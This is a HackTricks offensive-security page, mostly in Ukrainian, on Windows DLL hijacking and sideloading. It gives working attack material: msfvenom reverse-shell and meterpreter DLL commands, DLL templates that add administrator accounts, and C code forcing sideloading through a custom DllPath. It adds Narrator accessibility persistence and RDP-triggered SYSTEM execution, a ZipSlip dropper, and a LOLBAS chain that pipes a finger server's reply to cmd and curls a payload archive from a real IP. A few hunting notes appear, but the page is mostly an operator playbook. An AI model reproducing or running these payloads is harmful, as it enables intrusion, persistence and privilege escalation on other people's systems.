# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking передбачає змушення довіреної програми завантажити шкідливий DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Зазвичай використовується для виконання коду, досягнення persistence і, рідше, privilege escalation. Незалежно від акценту на escalation тут, метод hijacking залишається однаковим для різних цілей.

### Common Techniques

Існує кілька методів DLL hijacking, кожен з яких ефективний залежно від стратегії завантаження DLL застосунку:

1. **DLL Replacement**: Замінити справжній DLL на шкідливий, опціонально використовуючи DLL Proxying щоб зберегти функціональність оригінального DLL.
2. **DLL Search Order Hijacking**: Розмістити шкідливий DLL у шляху пошуку перед легітимним, експлуатуючи шаблон пошуку програми.
3. **Phantom DLL Hijacking**: Створити шкідливий DLL, який програма завантажить, вважаючи, що це відсутній необхідний DLL.
4. **DLL Redirection**: Змінити параметри пошуку, такі як %PATH% або файли .exe.manifest / .exe.local, щоб направити програму до шкідливого DLL.
5. **WinSxS DLL Replacement**: Замінити легітимний DLL на шкідливий у каталозі WinSxS — метод, часто пов’язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Розмістити шкідливий DLL у контролюваному користувачем каталозі разом зі скопійованою програмою, що нагадує техніки Binary Proxy Execution.

> [!TIP]
> Для покрокового ланцюжка, який нашаровує HTML staging, AES-CTR configs і .NET implants поверх DLL sideloading, перегляньте workflow нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) з sysinternals і встановити **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і показувати лише **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dlls загалом**, залиште це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутній dll у конкретному виконуваному файлі**, варто додати інший фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати його та зупинити захоплення подій.

## Exploiting Missing Dlls

Щоб підвищити privileges, найкращий шанс — мати можливість записати dll, який процес із підвищеними привілеями спробує завантажити, у деяке з місць, де він буде шукатися. Таким чином ми зможемо записати dll у папку, де dll шукається раніше ніж у папці з оригінальним dll (дивний випадок), або записати у папку, де dll буде шукатися, але оригінального dll не існує в жодній папці.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** шукають DLL, слідуючи набору заздалегідь визначених шляхів пошуку у певному порядку. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщено в одному з цих каталогів так, що він завантажується раніше за автентичний DLL. Рішенням для запобігання цьому є використання додатком абсолютних шляхів при посиланні на потрібні DLL.

Нижче наведено **DLL search order** для 32-bit систем:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **за замовчуванням** порядок пошуку при увімкненому **SafeDllSearchMode**. Коли його вимкнено, поточний каталог піднімається на друге місце. Щоб вимкнути цю функцію, створіть реєстрове значення **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує LoadLibraryEx.

Нарешті, зауважте, що dll може бути завантажено з указанням абсолютного шляху замість одного лише імені. У такому випадку цей dll буде шукатися тільки в тому шляху (якщо dll має залежності, вони будуть шукатися як просто завантажені за іменем).

Існують інші способи змінити порядок пошуку, але я не буду їх тут описувати.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use ProcMon filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів у відстежувану вхідну скриньку/шару; коли заплановане завдання знову запустить процес, він завантажить шкідливий DLL і виконає ваш код від імені облікового запису служби.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано впливати на шлях пошуку DLL для щойно створеного процесу — встановити поле DllPath в RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Підставивши тут директорію, контрольовану атакуючим, цільовий процес, який розв'язує імпортовану DLL за іменем (без абсолютного шляху і без використання безпечних прапорів завантаження), можна змусити завантажити шкідливий DLL з тієї директорії.

Ключова ідея
- Побудуйте параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що вказує на вашу контрольовану папку (наприклад, директорію, де знаходиться ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл розв'язує DLL за іменем, завантажувач звернеться до вказаного DllPath під час розв'язування, що дозволяє надійне sideloading навіть коли шкідливий DLL не знаходиться поруч із цільовим EXE.

Зауваження/обмеження
- Це впливає на дочірній процес, що створюється; це відрізняється від SetDllDirectory, який впливає лише на поточний процес.
- Ціль має імпортувати або викликати LoadLibrary для DLL за іменем (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs та захардкоджені абсолютні шляхи не можуть бути перехоплені. Forwarded exports і SxS можуть змінювати пріоритет.

Мінімальний приклад на C (ntdll, широкі рядки, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Вимоги**:

- Визначте процес, який працює або буде працювати з **іншими привілеями** (horizontal or lateral movement), у якого **відсутній DLL**.
- Переконайтеся, що у вас є **права запису** у будь-якій **папці**, в якій буде здійснюватися пошук DLL. Це місце може бути директорією виконуваного файлу або директорією в межах system path.

Так, вимоги складні для знаходження, бо **за замовчуванням доволі дивно знайти привілейований виконуваний файл, якому бракує dll** і ще **більш дивно мати права запису в папці system path** (you can't by default). Але в неправильно сконфігурованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте вимогам, можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проєкту — bypass UAC**, ви можете знайти там **PoC** для Dll hijaking для потрібної версії Windows, який можна використати (ймовірно, просто змінивши шлях до папки, в якій у вас є права запису).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити imports у executable та exports у dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного керівництва про те, як **abuse Dll Hijacking to escalate privileges** з правами на запис у **System Path folder** дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права запису в будь‑якій папці всередині system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll_.

### Приклад

Якщо ви знайдете експлуатаційний сценарій, однією з найважливіших речей для успішного використання буде **створити dll, який експортує принаймні всі функції, які виконуваний файл буде імпортувати з нього**. Зауважте, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або для [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні з dll hijacking, присвяченому виконанню: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете кілька **basic dll codes**, які можуть бути корисними як **шаблони** або для створення **dll з експортованими необов’язковими функціями**.

## **Створення та компіляція Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатний **виконувати ваш зловмисний код під час завантаження**, але також **експонувати** та **працювати** як **очікується**, переспрямовуючи всі виклики до реальної бібліотеки.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **вказати виконуваний файл і вибрати бібліотеку**, яку хочете proxify, і **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив x64 версії):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в кількох випадках Dll, який ви компілюєте, має **експортувати кілька функцій**, які будуть завантажені цільовим процесом; якщо цих функцій немає, **бінарний файл не зможе їх завантажити**, і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL з точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Дослідження випадку: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe все ще перевіряє передбачувану, специфічну для мови DLL локалізації під час запуску, яку можна захопити для виконання довільного коду та отримання персистентності.

Ключові факти
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Старий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо в OneCore-шляху існує записувана DLL, контрольована нападником, вона завантажується і виконується `DllMain(DLL_PROCESS_ATTACH)`. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантаження вказаного шляху.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- У контексті користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище, запуск Narrator завантажує розміщений DLL. На secure desktop (екрані входу), натисніть CTRL+WIN+ENTER щоб запустити Narrator; ваш DLL виконується як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозволити класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP до хоста, на екрані входу натисніть CTRL+WIN+ENTER щоб запустити Narrator; ваш DLL виконується як SYSTEM на secure desktop.
- Виконання зупиняється коли RDP сесія закривається — інжектуйте/мігруйте оперативно.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати вбудований Accessibility Tool (AT) реєстровий запис (наприклад, CursorIndicator), відредагувати його щоб вказати на довільний binary/DLL, імпортувати його, а потім встановити `configuration` на ім'я цього AT. Це проксуватиме довільне виконання під Accessibility framework.

Notes
- Запис у `%windir%\System32` та зміна значень HKLM вимагає прав адміністратора.
- Вся логіка payload може жити в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Компонент**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Дозволи директорії**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **Поведінка пошуку DLL**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтесь запуску запланованого завдання о 9:30 у контексті поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання завдання, шкідливий DLL запускається в сесії адміністратора на medium integrity.
4. Застосуйте стандартні UAC bypass techniques, щоб підвищити привілеї з medium integrity до SYSTEM.

## Кейс: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers з DLL side-loading, щоб виконувати payloads під довіреним, підписаним процесом.

Chain overview
- Користувач завантажує MSI. CustomAction виконується непомітно під час GUI-встановлення (наприклад, LaunchApplication або VBScript action), відновлюючи наступний етап із вбудованих ресурсів.
- Dropper записує легітимний, підписаний EXE і шкідливий DLL у той самий каталог (приклад пари: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли підписаний EXE запускається, Windows DLL search order спочатку завантажує wsc.dll з робочого каталогу, виконуючи код нападника під підписаним батьківським процесом (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Шукайте записи, що запускають виконувані файли або VBScript. Приклад підозрілого патерну: LaunchApplication, що виконує вбудований файл у фоновому режимі.
- У Orca (Microsoft Orca.exe), перевіряйте таблиці CustomAction, InstallExecuteSequence та Binary.
- Embedded/split payloads in the MSI CAB:
- Адміністративне витягнення: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька невеликих фрагментів, які конкатенуються та розшифровуються VBScript CustomAction. Звичний потік:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичне sideloading за допомогою wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем з його каталогу.
- wsc.dll: зловмисна DLL. Якщо не потрібні конкретні exports, DllMain достатньо; інакше зберіть proxy DLL і перенаправте потрібні exports до справжньої бібліотеки, запускаючи payload у DllMain.
- Зберіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог до експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus) щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка спирається на вирішення імен DLL хостовим бінарником. Якщо хост використовує абсолютні шляхи або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не вийти.
- KnownDLLs, SxS та forwarded exports можуть впливати на пріоритет і їх потрібно враховувати під час вибору хост-бінарника та набору експортів.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point описали, як Ink Dragon розгортає ShadowPad, використовуючи **three-file triad**, щоб злитися з легітимним софтом, поки основний payload зберігається зашифрованим на диску:

1. **Signed host EXE** – зловживання вендорами такими як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Атакувальники перейменовують виконуваний файл так, щоб він виглядав як Windows binary (наприклад `conhost.exe`), але Authenticode signature залишається дійсною.
2. **Malicious loader DLL** – скидається поруч з EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC-бінарником, обфускованим за допомогою ScatterBrain; її єдина задача — знайти зашифрований blob, розшифрувати його та reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` в тому ж каталозі. Після memory-mapping розшифрованого payload, loader видаляє TMP-файл, щоб знищити судові сліди.

Tradecraft notes:

* Перейменування підписаного EXE (зберігаючи оригінальний `OriginalFileName` у PE-заголовку) дозволяє йому маскуватися під Windows binary, але зберігати вендорський підпис; відтворюйте звичку Ink Dragon скидати `conhost.exe`-подібні бінарники, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається trusted, більшість allowlisting controls потребують лише, щоб ваш malicious DLL лежав поруч з ним. Зосередьтеся на кастомізації loader DLL; підписаний батько зазвичай може запускатися без змін.
* ShadowPad’s decryptor очікує, що TMP blob знаходиться поруч із loader та має бути записуваним, щоб він міг занулити файл після mapping. Тримайте каталог записуваним до завантаження payload; після знаходження в пам'яті TMP-файл можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading з LOLBAS так, щоб єдиним кастомним артефактом на диску була malicious DLL поруч із trusted EXE:

- **Remote command loader (Finger):** прихований PowerShell породжує `cmd.exe /c`, витягує команди з Finger server і передає їх в `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` тягне TCP/79 текст; `| cmd` виконує відповідь сервера, дозволяючи операторам крутанути second stage на стороні сервера.

- **Built-in download/extract:** Завантажити архів з benign extension, розпакувати його і stage-нути sideload target плюс DLL під випадковою папкою в `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ховає прогрес і слідує за redirects; `tar -xf` використовує вбудований в Windows tar.

- **WMI/CIM launch:** Запустити EXE через WMI так, щоб телеметрія показувала процес створений CIM під час завантаження colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з бінарниками, які віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під trusted іменем.

- **Hunting:** Граничте увагу на `forfiles`, коли одночасно з'являються `/p`, `/m` і `/c`; це рідко зустрічається поза адмін-скриптами.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Нещодавнє вторгнення Lotus Blossom зловживало trusted update chain, щоб доставити NSIS-packed dropper, який stage-ував DLL sideload плюс повністю in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, ставить його **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, і зашифрований blob `BluetoothService`, потім запускає EXE.
- Хост EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` розшифровує його за допомогою кастомного LCG-based stream (константи **0x19660D** / **0x3C6EF35F**, key material виводиться з попереднього hash), перезаписує буфер plaintext shellcode, звільняє тимчасові змінні і переходить до нього.
- Щоб уникнути IAT, loader вирішує API шляхом хешування імен експортів використовуючи **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює з підсоленими target hashes.

Main shellcode (Chrysalis)
- Розшифровує PE-like main module повторюючи add/XOR/sub з ключем `gQ2JR&9;` протягом п'яти проходів, потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення імпорт-реконструкції.
- Відтворює рядки імен DLL під час виконання через побітові rotate/XOR трансформації на кожному символі, потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який обходить **PEB → InMemoryOrderModuleList**, парсить кожну export table блоками по 4 байти з Murmur-style mixing, і тільки у випадку відсутності хешу падає back до `GetProcAddress`.

Embedded configuration & C2
- Конфіг живе всередині скинутого файла `BluetoothService` за **offset 0x30808** (size **0x980**) і RC4-decrypted з ключем `qwhvb^435h&*7`, відкриваючи C2 URL і User-Agent.
- Beacons будують dot-delimited host profile, додають префікс `4Q`, потім RC4-encrypt з ключем `vAuig34%^325hGV` перед `HttpSendRequestA` по HTTPS. Відповіді RC4-decrypt-яться і розподіляються через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Режим виконання контролюється CLI args: без аргументів = install persistence (service/Run key) вказуючи на `-i`; `-i` перезапускає себе з `-k`; `-k` пропускає install і запускає payload.

Alternate loader observed
- У тому ж intrusion скидали Tiny C Compiler і виконували `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, з `libtcc.dll` поруч. Наданий attacker C source вбудовував shellcode, компілював і запускав in-memory без запису PE на диск. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
